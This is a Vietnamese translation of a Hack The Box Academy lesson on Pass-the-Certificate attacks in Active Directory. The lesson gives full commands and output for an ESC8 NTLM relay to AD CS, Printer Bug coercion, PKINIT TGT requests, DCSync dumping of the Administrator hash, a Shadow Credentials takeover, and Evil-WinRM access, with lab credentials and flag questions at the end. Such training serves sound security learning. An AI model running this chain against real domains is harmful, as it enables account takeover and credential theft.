git# Pass the Certificate — Hack The Box Academy (Bản dịch tiếng Việt)

> Nguồn: `https://academy.hackthebox.com/app/module/147/section/1335`

**PKINIT** (Public Key Cryptography for Initial Authentication) là một phần mở rộng của giao thức Kerberos, cho phép sử dụng mật mã khóa công khai trong quá trình trao đổi xác thực. Kỹ thuật này thường được dùng để hỗ trợ đăng nhập người dùng bằng smart card, nơi lưu trữ private key.

**Pass-the-Certificate** là kỹ thuật sử dụng chứng chỉ **X.509** để lấy được **TGT (Ticket Granting Ticket)**. Phương pháp này chủ yếu được dùng kết hợp với các cuộc tấn công nhằm vào **Active Directory Certificate Services (AD CS)**, cũng như các cuộc tấn công **Shadow Credentials**.

## Tấn công NTLM Relay vào ADCS (ESC8)

ESC8 — được mô tả trong bài viết *Certified Pre-Owned* — là một dạng tấn công **NTLM relay** nhằm vào endpoint HTTP của ADCS. ADCS hỗ trợ nhiều phương thức đăng ký chứng chỉ (enrollment), bao gồm **web enrollment**, mặc định hoạt động qua HTTP. Một CA (certificate authority) được cấu hình cho phép web enrollment thường host ứng dụng tại đường dẫn `/CertSrv`:

> **Lưu ý:** Các cuộc tấn công nhằm vào Active Directory Certificate Services được trình bày chi tiết trong module **ADCS Attacks**.

<img width="1020" height="413" alt="image" src="https://github.com/user-attachments/assets/f621944c-f9fe-463e-80f6-7698ff0d2c58" />


*Trang chủ ADCS Web Enrollment tại `http://ca01.inlanefreight.local/certsrv/Default.asp` — cho phép yêu cầu chứng chỉ, kiểm tra trạng thái yêu cầu đang chờ, hoặc tải CA certificate/certificate chain/CRL.*

Kẻ tấn công có thể dùng `ntlmrelayx` của Impacket để lắng nghe các kết nối đến và relay chúng tới dịch vụ web enrollment bằng lệnh sau:

```shellsession
to3co@htb[/htb]$ impacket-ntlmrelayx -t https://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template DomainControllerAuthentication
```

> **Lưu ý:** Giá trị truyền vào `--template` có thể khác nhau tùy môi trường. Đây chính là certificate template mà Domain Controller sử dụng để xác thực. Các template này có thể được liệt kê (enumerate) bằng các công cụ như `certipy`.

Kẻ tấn công có thể chờ nạn nhân tự xác thực vào máy do chúng kiểm soát, hoặc chủ động **coerce (ép buộc)** nạn nhân thực hiện việc đó. Một cách để buộc máy tính (machine account) xác thực đến host tùy ý là khai thác **Printer Bug**. Cuộc tấn công này yêu cầu máy đích phải có dịch vụ **Print Spooler** đang chạy. Lệnh dưới đây buộc `10.129.234.109 (DC01)` xác thực đến `10.10.16.12` (máy của kẻ tấn công):

```shellsession
to3co@htb[/htb]$ python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Attempting to trigger authentication via rprn RPC at 10.129.234.109
Bind OK
Got handle
SessionError: code: 0x6ba - RPC_S_SERVER_UNAVAILABLE - The RPC server is unavailable.
Triggered RPC backconnect, this may or may not have worked
```

Quay lại `ntlmrelayx`, có thể thấy trong output rằng yêu cầu xác thực đã được relay thành công đến ứng dụng web enrollment, và một chứng chỉ đã được cấp cho `DC01$`:

```shellsession
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Protocol Client SMTP loaded..
Protocol Client SMB loaded..
Protocol Client RPC loaded..
Protocol Client MSSQL loaded..
Protocol Client LDAPS loaded..
Protocol Client LDAP loaded..
Protocol Client IMAP loaded..
Protocol Client IMAPS loaded..
Protocol Client HTTP loaded..
Protocol Client HTTPS loaded..
Protocol Client DCSYNC loaded..
Running in relay mode to single host
Setting up SMB Server on port 445
Setting up HTTP Server on port 80
Setting up WCF Server on port 9389
Setting up RAW Server on port 6666
Multirelay disabled

Servers started, waiting for connections
SMBD-Thread-5 (process_request_thread): Received connection from 10.129.234.109, attacking target http://10.129.234.110
HTTP server returned error code 404, treating as a successful login
Authenticating against http://10.129.234.110 as INLANEFREIGHT/DC01$ SUCCEED
SMBD-Thread-7 (process_request_thread): Received connection from 10.129.234.109, attacking target http://10.129.234.110
Authenticating against http://10.129.234.110 as / FAILED
Generating CSR...
CSR generated!
Getting certificate...
GOT CERTIFICATE! ID 8
Writing PKCS#12 certificate to ./DC01$.pfx
Certificate successfully written to file
```

Sau khi có chứng chỉ, ta có thể thực hiện tấn công **Pass-the-Certificate** để lấy TGT với vai trò `DC01$`. Một cách để làm điều này là dùng `gettgtpkinit.py`. Trước tiên, clone repository và cài đặt các dependency:

```shellsession
to3co@htb[/htb]$ git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
to3co@htb[/htb]$ python3 -m venv .venv
to3co@htb[/htb]$ source .venv/bin/activate
to3co@htb[/htb]$ pip3 install -r requirements.txt
```

Sau đó ta có thể bắt đầu tấn công.

> **Lưu ý:** Nếu gặp lỗi `"Error detecting the version of cryptography"`, có thể khắc phục bằng cách cài thêm thư viện `oscrypto`.

```shellsession
to3co@htb[/htb]$ pip3 install -I git+https://github.com/wbond/oscrypto.git
```

```shellsession
to3co@htb[/htb]$ python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache

2024-04-28 21:20:40,073 minikerberos INFO     Loading certificate and key from file
2024-04-28 21:20:40,351 minikerberos INFO     Requesting TGT
2024-04-28 21:21:05,508 minikerberos INFO     AS-REP encryption key (you might need this later):
2024-04-28 21:21:05,508 minikerberos INFO     3a1d192a28a4e70e02ae4f1d57bad4adbc7c0b3e7dceb59dab90b8a54f39d616
2024-04-28 21:21:05,512 minikerberos INFO     Saved TGT to file
```

Sau khi lấy được TGT, chúng ta trở lại lãnh địa quen thuộc của **Pass-the-Ticket (PtT)**. Với vai trò là tài khoản máy của domain controller, ta có thể thực hiện tấn công **DCSync**, ví dụ để lấy NTLM hash của tài khoản domain administrator:

```shellsession
to3co@htb[/htb]$ export KRB5CCNAME=/tmp/dc.ccache
to3co@htb[/htb]$ impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 --just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:...SNIP...:::
```

## Shadow Credentials (msDS-KeyCredentialLink)

**Shadow Credentials** là kỹ thuật tấn công Active Directory lợi dụng thuộc tính **msDS-KeyCredentialLink** của user nạn nhân. Thuộc tính này lưu trữ các public key có thể dùng để xác thực qua **PKINIT**. Trong BloodHound, edge **AddKeyCredentialLink** cho biết một user có quyền ghi (write) lên thuộc tính `msDS-KeyCredentialLink` của user khác, từ đó cho phép chiếm quyền kiểm soát đối tượng đó.

<img width="1129" height="279" alt="image" src="https://github.com/user-attachments/assets/4f9c2297-d3d0-4ada-a19e-f36c96fa554e" />


*Trong BloodHound, `wwhite@inlanefreight.local` có quyền `AddKeyCredentialLink` đối với `jpinkman@inlanefreight.local`, nghĩa là `wwhite` có thể chiếm quyền kiểm soát tài khoản `jpinkman`.*

Ta có thể dùng **pywhisker** để thực hiện tấn công này từ máy Linux. Lệnh dưới đây tạo một chứng chỉ **X.509** và ghi **public key** vào thuộc tính `msDS-KeyCredentialLink` của user nạn nhân:

```shellsession
to3co@htb[/htb]$ pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add

Searching for the target account
Target user found: CN=Jesse Pinkman,CN=Users,DC=inlanefreight,DC=local
Generating certificate
Certificate generated
Generating KeyCredential
KeyCredential generated with DeviceID: 3496da7f-ab0d-13e0-1273-5abca66f901d
Updating the msDS-KeyCredentialLink attribute of jpinkman
Updated the msDS-KeyCredentialLink attribute of the target object
Converting PEM -> PFX with cryptography: eFUVVTPf.pfx
PFX exportiert nach: eFUVVTPf.pfx
Passwort für PFX: bmRH4LK7UwPrAOfvIx6W
Saved PFX (#PKCS12) certificate & key at path: eFUVVTPf.pfx
Must be used with password: bmRH4LK7UwPrAOfvIx6W
A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

Từ output trên, có thể thấy một file **PFX (PKCS12)** đã được tạo (`eFUVVTPf.pfx`), kèm theo mật khẩu. Ta sẽ dùng file này với `gettgtpkinit.py` để lấy TGT với vai trò nạn nhân:

```shellsession
to3co@htb[/htb]$ python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache

2024-04-28 20:50:04,728 minikerberos INFO     Loading certificate and key from file
2024-04-28 20:50:04,775 minikerberos INFO     Requesting TGT
2024-04-28 20:50:04,929 minikerberos INFO     AS-REP encryption key (you might need this later):
2024-04-28 20:50:04,929 minikerberos INFO     f4fa8808fb476e6f982318494f75e002f8ee01c64199b3ad7419f927736ffdb8
2024-04-28 20:50:04,937 minikerberos INFO     Saved TGT to file
```

Với TGT đã có, ta lại có thể **pass the ticket**:

```shellsession
to3co@htb[/htb]$ export KRB5CCNAME=/tmp/jpinkman.ccache
to3co@htb[/htb]$ klist

Ticket cache: FILE:/tmp/jpinkman.ccache
Default principal: jpinkman@INLANEFREIGHT.LOCAL

Valid starting     Expires            Service principal
04/28/2025 20:50:04  04/29/2025 06:50:04  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
```

Trong trường hợp này, ta phát hiện user nạn nhân là thành viên của group **Remote Management**, cho phép kết nối vào máy qua **WinRM**. Như đã trình bày ở phần trước, ta có thể dùng **Evil-WinRM** để kết nối bằng Kerberos (lưu ý: đảm bảo `krb5.conf` đã được cấu hình đúng):

```shellsession
to3co@htb[/htb]$ evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Info: For more information, check Evil-WinRM GitHub:
https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jpinkman\Documents> whoami
inlanefreight\jpinkman
```

## Điều gì xảy ra nếu không thể dùng PKINIT?

Trong một số môi trường, kẻ tấn công có thể lấy được chứng chỉ nhưng lại không thể dùng nó để xác thực (pre-authentication) với vai trò nạn nhân cụ thể (ví dụ: tài khoản máy của domain controller) do KDC không hỗ trợ **EKU (Extended Key Usage)** phù hợp. Công cụ **PassTheCert** được tạo ra cho tình huống này. Nó có thể được dùng để xác thực vào **LDAPS** bằng chứng chỉ và thực hiện các cuộc tấn công khác (ví dụ: đổi mật khẩu hoặc cấp quyền DCSync). Kỹ thuật này nằm ngoài phạm vi của module này nhưng đáng để tìm hiểu thêm.

## Tổng kết

Sau khi đã thấy các kỹ thuật lateral movement khác nhau có thể thực hiện từ máy Windows và Linux, phần tiếp theo sẽ chuyển hướng sang một chủ đề mới: **quản lý mật khẩu (password management)**. Nên luyện tập các kỹ thuật lateral movement này cho đến khi thành thục, vì trong một bài đánh giá thực tế, ta không thể biết trước sẽ gặp phải tình huống gì — do đó việc có một bộ công cụ đa dạng để dự phòng là rất quan trọng.

---

### Câu hỏi (Questions)

**Câu 1 (+40 XP):** Nội dung của file `flag.txt` trên desktop của `jpinkman` là gì?
Xác thực với user `wwhite` và mật khẩu `package5shores_topher1`.

**Câu 2 (+40 XP):** Nội dung của file `flag.txt` trên desktop của `Administrator` là gì?

> *Lưu ý: cần khởi động (spawn) target system trên HTB Academy để lấy IP và trả lời các câu hỏi trên.*
